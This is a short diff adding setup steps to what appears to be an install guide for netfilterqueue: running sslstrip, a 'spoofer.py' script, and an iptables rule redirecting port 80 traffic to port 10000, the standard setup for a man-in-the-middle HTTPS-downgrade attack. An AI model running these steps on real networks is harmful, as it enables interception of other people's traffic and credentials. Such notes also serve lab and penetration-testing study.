@@ -19,4 +19,8 @@ How to install netfilterqueue:
 
 
 service apache2 start
-    
+
+
+run sslstrip
+run python spoofer.py
+run iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
